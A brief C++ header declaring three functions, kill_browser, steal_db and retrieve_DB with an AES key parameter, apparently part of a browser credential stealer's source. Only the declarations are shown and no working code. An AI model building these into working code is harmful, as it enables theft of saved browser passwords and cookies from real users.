#pragma once

void kill_browser(const std::vector<std::string>& browser_process);
void steal_db(std::string path);
void retrieve_DB(const std::string& dbname, const std::string& query, const std::vector<BYTE>& aeskey);
